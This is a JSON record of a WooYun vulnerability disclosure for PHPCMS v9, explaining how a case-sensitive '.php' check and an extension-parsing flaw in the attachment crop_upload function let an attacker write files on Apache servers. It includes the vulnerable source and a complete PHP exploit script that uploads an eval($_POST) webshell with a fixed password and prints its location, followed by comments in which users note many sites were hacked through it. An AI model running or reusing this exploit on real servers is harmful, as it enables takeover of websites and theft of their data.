{"id": 14248, "wybug_id": "wooyun-2013-019299", "wybug_title": "PHPCMS v9 Getshell（Apache）", "wybug_corp": "phpcms", "wybug_author": "n3wF", "wybug_date": "2013-02-27 23:17", "wybug_open_date": "2013-03-04 23:17", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传", "解析漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpcms v9 getshell (apache) 详细说明：  漏洞文件：phpcms\\modules\\attachment\\attachments.php\n　　public function crop_upload() {\t\t\tif (isset($GLOBALS[\"HTTP_RAW_POST_DATA\"])) {　　\t\t\t$pic = $GLOBALS[\"HTTP_RAW_POST_DATA\"];　　\t\t\tif (isset($_GET['width']) && !empty($_GET['width'])) {　　\t\t\t\t$width = intval($_GET['width']);　　\t\t\t}　　\t\t\tif (isset($_GET['height']) && !empty($_GET['height'])) {　　\t\t\t\t$height = intval($_GET['height']);　　\t\t\t}　　\t\t\tif (isset($_GET['file']) && !empty($_GET['file'])) {　　\t\t\t\t$_GET['file'] = str_replace(';','',$_GET['file']);//过滤了分号　　\t\t\t\tif(is_image($_GET['file'])== false || strpos($_GET['file'],'.php')!==false) exit();//is_image()检测是个关键　　\t\t\t\tif (strpos($_GET['file'], pc_base::load_config('system', 'upload_url'))!==false) {　　\t\t\t\t\t$file = $_GET['file'];　　\t\t\t\t\t$basename = basename($file);//获取带有后缀的文件名　　\t\t\t\t\tif (strpos($basename, 'thumb_')!==false) {　　\t\t\t\t\t\t$file_arr = explode('_', $basename);　　\t\t\t\t\t\t$basename = array_pop($file_arr);　　\t\t\t\t\t}　　\t\t\t\t\t$new_file = 'thumb_'.$width.'_'.$height.'_'.$basename;　　\t\t\t\t} else {　　\t\t\t\t\tpc_base::load_sys_class('attachment','',0);　　\t\t\t\t\t$module = trim($_GET['module']);　　\t\t\t\t\t$catid = intval($_GET['catid']);　　\t\t\t\t\t$siteid = $this->get_siteid();　　\t\t\t\t\t$attachment = new attachment($module, $catid, $siteid);　　\t\t\t\t\t$uploadedfile['filename'] = basename($_GET['file']); 　　\t\t\t\t\t$uploadedfile['fileext'] = fileext($_GET['file']);　　\t\t\t\t\tif (in_array($uploadedfile['fileext'], array('jpg', 'gif', 'jpeg', 'png', 'bmp'))) {　　\t\t\t\t\t\t$uploadedfile['isimage'] = 1;　　\t\t\t\t\t}　　\t\t\t\t\t$file_path = $this->upload_path.date('Y/md/');　　\t\t\t\t\tpc_base::load_sys_func('dir');　　\t\t\t\t\tdir_create($file_path);　　\t\t\t\t\t$new_file = date('Ymdhis').rand(100, 999).'.'.$uploadedfile['fileext'];　　\t\t\t\t\t$uploadedfile['filepath'] = date('Y/md/').$new_file;　　\t\t\t\t\t$aid = $attachment->add($uploadedfile);　　\t\t\t\t}　　\t\t\t\t$filepath = date('Y/md/');　　\t\t\t\tfile_put_contents($this->upload_path.$filepath.$new_file, $pic);//文件名可控、$pic可控　　\t\t\t} else {　　\t\t\t\treturn false;　　\t\t\t}　　\t\t\techo pc_base::load_config('system', 'upload_url').$filepath.$new_file;　　\t\t\texit;　　\t\t}　　\t}\n后缀检测：phpcms\\modules\\attachment\\functions\\global.func.php\nfunction is_image($file) {　　\t$ext_arr = array('jpg','gif','png','bmp','jpeg','tiff');　　\t$ext = fileext($file);关键地方　　\treturn in_array($ext,$ext_arr) ? $ext_arr :false;　　}\n关键函数:\n　　function fileext($filename) {　　\treturn strtolower(trim(substr(strrchr($filename, '.'), 1, 10)));　　}\n　　Fileext函数是对文件后缀名的提取。　　根据此函数我们如果上传文件名为ddd.Php.jpg%20%20%20%20%20%20%20Php　　经过此函数提取到的后缀还是jpg，因此正在is_image()函数中后缀检测被绕过了。　　我们回到public function crop_upload() 函数中　　if(is_image($_GET['file'])== false || strpos($_GET['file'],'.php')!==false) exit();　　在经过了is_image的判断之后又来了个.php的判断，在此程序员使用的是strpos函数　　这个函数是对大小写敏感的函数我们使用.Php就可以直接绕过了。　　经过上边的两层的过滤我们的ddd.Php.jpg%20%20%20%20%20%20%20Php后缀依然有效。　　最后$basename变量的值就为ddd.Php.jpg%20%20%20%20%20%20%20Php 然后使用file_put_contents函数写入到了指定目录。　　看见ddd.Php.jpg%20%20%20%20%20%20%20Php这个后缀，大家应该明白了，它用在apache搭建的服务器上可以被解析。   漏洞证明：  exp:\n<?phperror_reporting(E_ERROR);set_time_limit(0);$pass=\"ln\";print_r('+---------------------------------------------------------------------------+PHPCms V9 GETSHELL 0DAY code by L.N.apache 适用(利用的apache的解析漏洞)+---------------------------------------------------------------------------+');if ($argc < 2) {print_r('+---------------------------------------------------------------------------+Usage: php '.$argv[0].' url pathExample: \t1.php '.$argv[0].' lanu.sinaapp.com\t2.php '.$argv[0].' lanu.sinaapp.com /phpcms+---------------------------------------------------------------------------+');exit;}$url = $argv[1];$path = $argv[2];$phpshell = '<?php @eval($_POST[\\''.$pass.'\\']);?>';$file = '1.thumb_.Php.JPG%20%20%20%20%20%20%20Php';if($ret=Create_dir($url,$path)){\t//echo $ret;\t$pattern = \"|Server:[^,]+?|U\";\tpreg_match_all($pattern, $ret, $matches);\tif($matches[0][0])\t{\t\tif(strpos($matches[0][0],'Apache') == false)\t\t{\t\t\techo \"\\n亲！此网站不是apache的网站。\\n\";exit;\t\t}\t}\t$ret = GetShell($url,$phpshell,$path,$file);\t$pattern = \"|http:\\/\\/[^,]+?\\.,?|U\";\tpreg_match_all($pattern, $ret, $matches);\tif($matches[0][0])\t{\t\techo \"\\n\".'密码为: '.$pass.\"\\n\";\t\techo \"\\r\\nurl地址: \".$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;\t}\telse\t{\t\t\t$pattern = \"|\\/uploadfile\\/[^,]+?\\.,?|U\";\t\tpreg_match_all($pattern, $ret, $matches);\t\tif($matches[0][0])\t\t{\t\t\techo \"\\n\".'密码为: '.$pass.\"\\n\";\t\t\techo \"\\r\\nurl地址:\".'http://'.$url.$path.$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;\t\t}\t\telse\t\t{\t\t\techo \"\\r\\n没得到！\\n\";exit;\t\t}\t\t\t}}function GetShell($url,$shell,$path,$js){    $content =$shell;    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://\".$url.$path.\"/uploadfile/\".$js.\" HTTP/1.1\\r\\n\";     $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock) \t{        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }\telse\t{\t\tfwrite($ock,$data);\t\t$resp = '';\t\twhile (!feof($ock)) \t\t{\t\t\t$resp.=fread($ock, 1024);\t\t}\t\treturn $resp;\t}}function Create_dir($url,$path=''){    $content ='I love you';    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://lanu.sinaapp.com/1.jpg HTTP/1.1\\r\\n\";     $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock) \t{        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }\tfwrite($ock,$data);    $resp = '';    while (!feof($ock)) \t{        $resp.=fread($ock, 1024);    }\treturn $resp;}?>\n   修复方案：  过滤过滤再过滤   版权声明：转载请注明来源 n3wF@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-03-04 23:17 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-02-27 23:22 |    \t\t暗夜清风 \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:10        | 大哥,你的娃娃掉了.举手之劳,不必以身相许)\t\t \n  出租广告位    \n     2013-02-28 00:23 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  出租广告位     \n     2013-02-28 05:07 |    \t\tBlack World \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 无孔不入)\t\t \n  又一个狂风到来 .    \n     2013-02-28 08:13 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  出租小马扎，汽水，爆米花，恰恰瓜子。    \n     2013-02-28 10:30 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  FLASH上传文件那里？    \n     2013-02-28 11:09 |    \t\t無情 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 根据相关法律法规和政策，此信息未予显示。)\t\t \n  坐等公开。。。    \n     2013-02-28 11:33 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  估计就是老的那个漏洞，，。。。纯粹是服务器环境问题。如果要从修改代码的方向杜绝这个问题的话，我是没辙了。。 WooYun: PHPCMS V9 getwebshell漏洞    \n     2013-02-28 14:48 |    \t\t90_ \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:10        | 关注网络信息安全。)\t\t \n  成都信息学院的学生？    \n     2013-03-01 21:32 |    \t\tL.N. \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | 不断进步····)\t\t \n  @tenzy 修改代码可以杜绝的！他获取后缀的时候来了个1-10.    \n     2013-03-02 21:53 |    \t\tYouTube \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | YouTube是世界上最大的视频分享网站，早期...)\t\t \n  不明觉历    \n     2013-03-05 00:36 |    \t\tn3wF \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  =.=好忽略    \n     2013-03-06 11:24 |    \t\t梦醉清风 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | 1995年介入安全工作，主要从事信息安全测评...)\t\t \n  这个漏洞需要些水平，主要是写语句的水平    \n     2013-03-07 23:25 |    \t\tHello_C \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 谦和温顺且自持的生活,不乱于心，不困于情...)\t\t \n  我~次奥~忽略了?    \n     2013-03-07 23:34 |    \t\tn3wF \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  @Hello_C 你答对了=。=·    \n     2013-03-08 11:14 |    \t\t社长 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:17        | 网络安全爱好者)\t\t \n  这个洞已经让很多站遭殃了    \n     2013-03-08 18:24 |    \t\tn3wF \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  @社长 所以说phpcms给各位大黑阔带来了好多肉鸡和裤子啊。一起感谢phpcms吧    \n     2013-03-08 23:16 |    \t\t社长 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:17        | 网络安全爱好者)\t\t \n  @n3wF 这几天DZ的0day也很火啊    \n     2013-03-09 09:53 |    \t\tn3wF \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  @社长 求来一发    \n     2013-03-10 23:33 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @社长 来一发    \n     2013-03-12 19:23 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @tenzy @L.N. 我是觉得奇怪的为什么file参数要允许url传入，难道要支持远程裁剪图片么，但真是这样的话，应该抽出来独立来做才对，而不是现在这样疑似违反类的单一职责原则...修复方案可以考虑根据附件模型，作正则匹配（这部分需要对phpcms有一定了解）；并且写入时，不允许多后缀名，一种文件命名示例是：sha1或md5($_GET['file'])+经过验证的图片后缀名（怕麻烦可以直接.jpg结尾，反正浏览器显示图片并不会管后缀名）    \n     2013-06-07 20:22 |    \t\t情逍遥 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        )\t\t \n  @90_ 你是成都工程信息工程学院的学生？    \n     2013-06-09 18:54 |    \t\t90_ \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:10        | 关注网络信息安全。)\t\t \n  @情逍遥 有事么？    \n     2013-06-12 12:38 |    \t\t情逍遥 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        )\t\t \n  @90_ 没有什么事，我也是这个学校的。如果是，想认识下。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}